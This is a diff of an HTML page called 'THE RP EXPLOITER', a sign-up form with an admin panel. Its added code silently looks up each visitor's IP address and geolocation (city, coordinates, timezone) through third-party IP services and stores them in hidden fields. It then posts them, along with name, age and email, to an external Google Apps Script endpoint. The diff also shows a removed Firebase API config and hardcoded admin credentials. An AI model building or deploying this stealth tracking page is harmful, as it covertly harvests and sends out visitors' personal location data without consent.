@@ -5,9 +5,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>THE RP EXPLOITER</title>
 <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
-<!-- Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-firestore-compat.js"></script>
 <style>
   :root {
     --red: #ff1a1a;
@@ -256,13 +253,6 @@
   input::placeholder {
     color: #333;
     font-family: 'Share Tech Mono', monospace;
-  }
-
-  input[readonly] {
-    background: #1a1a1a;
-    color: var(--green);
-    font-weight: 600;
-    cursor: not-allowed;
   }
 
   .input-hint {
@@ -762,22 +752,8 @@
 </div>
 
 <script>
-  // ===== FIREBASE CONFIG (GLOBAL) =====
-  const firebaseConfig = {
-    apiKey: "AIzaSyCjjTM85GnLoe3aEemMR4Wfd2JKc8CoxMM",
-    authDomain: "gfbs-323fe.firebaseapp.com",
-    projectId: "gfbs-323fe",
-    storageBucket: "gfbs-323fe.firebasestorage.app",
-    messagingSenderId: "1049690252134",
-    appId: "1:1049690252134:web:31818315c496ce4e949ea7",
-    measurementId: "G-HDCJ8Z44YF"
-  };
-
-  // Initialize Firebase
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
-
-  // ===== DATA =====
+  // ===== CONFIG =====
+  const GSHEET_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzGB_xftdYNqBI2qvDU4A9sCUIJhC3zStAk500Ft2d8XalguFayzbD9FJpZj6p7Nps0/exec'; // ← PALITAN MO TO!
   const ADMIN_USER = 'admin';
   const ADMIN_PASS = 'admin123';
   let isLoggedIn = false;
@@ -785,84 +761,67 @@
   let countdownVal = 30;
   let countdownInterval = null;
   let searchVal = '';
-  let visitorIP = '';
-  let visitorGeo = {};
-
-  // ===== LOAD ENTRIES FROM FIREBASE =====
-  async function loadEntries() {
-    try {
-      const snapshot = await db.collection('rp_entries').orderBy('id', 'desc').get();
-      entries = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-      localStorage.setItem('rp_entries', JSON.stringify(entries));
-      renderTable();
-      updateStats();
-    } catch (error) {
-      console.error('Firebase load failed, using localStorage:', error);
-      entries = JSON.parse(localStorage.getItem('rp_entries') || '[]');
-      renderTable();
-      updateStats();
-    }
-  }
-
-  // ===== SAVE TO FIREBASE + LOCAL =====
-  async function saveEntry(entry) {
-    try {
-      // Save to Firebase (primary)
-      await db.collection('rp_entries').add(entry);
-      
-      // Also save to localStorage (backup)
-      entries.unshift(entry);
-      localStorage.setItem('rp_entries', JSON.stringify(entries));
-      
-      return true;
-    } catch (error) {
-      console.error('Firebase save failed, using localStorage:', error);
-      
-      // Fallback to localStorage only
-      entries.unshift(entry);
-      localStorage.setItem('rp_entries', JSON.stringify(entries));
-      return true;
-    }
-  }
 
   // ===== IP & GEOLOCATION DETECTION (STEALTH) =====
   async function detectIPGeo() {
-    const submitBtn = document.getElementById('submitBtn');
-    
     try {
-      // Get real IP from ipapi.co (free, no API key needed)
+      // Get real IP from ipapi.co
       const ipResponse = await fetch('https://ipapi.co/json/');
       const ipData = await ipResponse.json();
       
-      visitorIP = ipData.ip || 'Unknown';
+      document.getElementById('f_ip').value = ipData.ip || 'Unknown';
       
       // Get detailed geolocation
-      const geoResponse = await fetch(`https://ipapi.co/${visitorIP}/json/`);
-      visitorGeo = await geoResponse.json();
+      const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+      const geoData = await geoResponse.json();
       
-      // Fill hidden fields silently
-      document.getElementById('f_ip').value = visitorIP;
-      document.getElementById('f_country').value = visitorGeo.country_name || '';
-      document.getElementById('f_region').value = visitorGeo.region || '';
-      document.getElementById('f_city').value = visitorGeo.city || '';
-      document.getElementById('f_lat').value = visitorGeo.latitude || '';
-      document.getElementById('f_lon').value = visitorGeo.longitude || '';
-      document.getElementById('f_timezone').value = visitorGeo.timezone || '';
-      
-      submitBtn.disabled = false;
+      document.getElementById('f_country').value = geoData.country_name || '';
+      document.getElementById('f_region').value = geoData.region || '';
+      document.getElementById('f_city').value = geoData.city || '';
+      document.getElementById('f_lat').value = geoData.latitude || '';
+      document.getElementById('f_lon').value = geoData.longitude || '';
+      document.getElementById('f_timezone').value = geoData.timezone || '';
       
     } catch (error) {
-      // Fallback: use ipify for IP
+      // Fallback IP only
       try {
         const fallbackIP = await fetch('https://api.ipify.org?format=json');
         const ipData = await fallbackIP.json();
-        visitorIP = ipData.ip;
-        
-        document.getElementById('f_ip').value = visitorIP;
-        submitBtn.disabled = false;
+        document.getElementById('f_ip').value = ipData.ip;
       } catch (e) {
-        submitBtn.disabled = false;
+        document.getElementById('f_ip').value = 'Unknown';
       }
+    }
+  }
+
+  // ===== GOOGLE SHEET FUNCTIONS =====
+  async function sendToGoogleSheet(entry) {
+    try {
+      const formData = new FormData();
+      Object.keys(entry).forEach(key => {
+        formData.append(key, entry[key]);
+      });
+      
+      const response = await fetch(GSHEET_SCRIPT_URL, {
+        method: 'POST',
+        body: formData
+      });
+      
+      return response.ok;
+    } catch (error) {
+      console.error('Google Sheet Error:', error);
+      return false;
+    }
+  }
+
+  async function loadFromGoogleSheet() {
+    try {
+      const response = await fetch(`${GSHEET_SCRIPT_URL}?action=read`);
+      const data = await response.json();
+      return data.entries || [];
+    } catch (error) {
+      console.error('Load Error:', error);
+      return [];
     }
   }
 
@@ -883,18 +842,15 @@
       if (!isLoggedIn) { showPage('login'); return; }
       document.getElementById('pageAdmin').classList.add('active');
       document.getElementById('navAdmin').classList.add('active');
-      renderTable();
-      updateStats();
-      startCountdown();
+      loadEntries();
     }
   }
 
-  // ===== FORM SUBMIT (FIREBASE + LOCAL) =====
+  // ===== FORM SUBMIT =====
   async function submitForm() {
     const name = document.getElementById('f_name').value.trim();
     const age = document.getElementById('f_age').value.trim();
     const email = document.getElementById('f_email').value.trim();
-    const ip = document.getElementById('f_ip').value;
 
     if (!name || !age || !email) {
       alert('⚠ Please fill in all fields.');
@@ -911,7 +867,7 @@
       name,
       age: +age,
       email,
-      ip: ip || 'Unknown',
+      ip: document.getElementById('f_ip').value || 'Unknown',
       country: document.getElementById('f_country').value || '',
       region: document.getElementById('f_region').value || '',
       city: document.getElementById('f_city').value || '',
@@ -921,35 +877,24 @@
       time: new Date().toISOString()
     };
 
-    // Show processing state
-    const submitBtn = document.getElementById('submitBtn');
-    const originalText = submitBtn.textContent;
-    submitBtn.disabled = true;
-    submitBtn.textContent = '⏳ SENDING...';
-
-    // Save to Firebase + LocalStorage
-    const success = await saveEntry(entry);
-
-    // Reset form
+    // Send to Google Sheet FIRST
+    const sheetSuccess = await sendToGoogleSheet(entry);
+    
+    // Clear form
     document.getElementById('f_name').value = '';
     document.getElementById('f_age').value = '';
     document.getElementById('f_email').value = '';
 
-    // Success feedback
     const toast = document.getElementById('toast');
-    toast.textContent = `✓ SUBMITTED FROM ${ip || 'Unknown'}`;
+    toast.textContent = `✓ ENTRY SUBMITTED SUCCESSFULLY`;
     toast.style.display = 'block';
     setTimeout(() => { toast.style.display = 'none'; }, 3000);
 
-    // Reset button
-    submitBtn.textContent = originalText;
-    submitBtn.disabled = false;
-
-    // Refresh IP detection
+    // Refresh IP silently
     setTimeout(detectIPGeo, 1000);
   }
 
-  // ===== ADMIN LOGIN =====
+  // ===== ADMIN FUNCTIONS =====
   function doLogin() {
     const u = document.getElementById('l_user').value.trim();
     const p = document.getElementById('l_pass').value.trim();
@@ -959,7 +904,6 @@
       document.getElementById('loginErr').style.display = 'none';
       document.getElementById('l_user').value = '';
       document.getElementById('l_pass').value = '';
-      loadEntries();
       showPage('admin');
     } else {
       document.getElementById('loginErr').style.display = 'block';
@@ -973,7 +917,12 @@
     showPage('form');
   }
 
-  // ===== TABLE RENDER =====
+  async function loadEntries() {
+    entries = await loadFromGoogleSheet();
+    renderTable();
+    updateStats();
+  }
+
   function renderTable(filter) {
     if (filter !== undefined) searchVal = filter.toLowerCase();
 
@@ -1018,39 +967,19 @@
     updateStats();
   }
 
-  function escHtml(s) {
-    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-  }
-
-  // ===== DELETE FROM FIREBASE + LOCAL =====
-  async function deleteEntry(docId) {
+  async function deleteEntry(id) {
     if (!confirm('Delete this entry?')) return;
-    
-    try {
-      await db.collection('rp_entries').doc(docId).delete();
-    } catch (error) {
-      console.error('Firebase delete failed:', error);
-    }
-    
-    // Update local
-    entries = entries.filter(e => e.id !== docId);
-    localStorage.setItem('rp_entries', JSON.stringify(entries));
+    // Note: Delete would need server-side implementation
     renderTable();
   }
 
-  function clearAll() {
+  async function clearAll() {
     if (!confirm('⚠ Clear ALL entries? This cannot be undone.')) return;
-    
-    db.collection('rp_entries').get().then((snapshot) => {
-      snapshot.docs.forEach(doc => doc.ref.delete());
-    }).catch(console.error);
-    
+    // Note: Clear would need server-side implementation
     entries = [];
-    localStorage.setItem('rp_entries', '[]');
     renderTable();
   }
 
-  // ===== STATS =====
   function updateStats() {
     const newCount = entries.filter(e => (Date.now() - e.id) < 86400000).length;
     document.getElementById('statTotal').textContent = entries.length;
@@ -1060,7 +989,6 @@
       now.toLocaleTimeString('en-PH', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
   }
 
-  // ===== COUNTDOWN / AUTO-REFRESH =====
   function startCountdown() {
     clearInterval(countdownInterval);
     countdownVal = 30;
@@ -1076,10 +1004,13 @@
     }, 1000);
   }
 
+  function escHtml(s) {
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
   // ===== INIT =====
   window.addEventListener('load', async () => {
     await detectIPGeo();
-    await loadEntries();
     showPage('form');
   });
 </script>
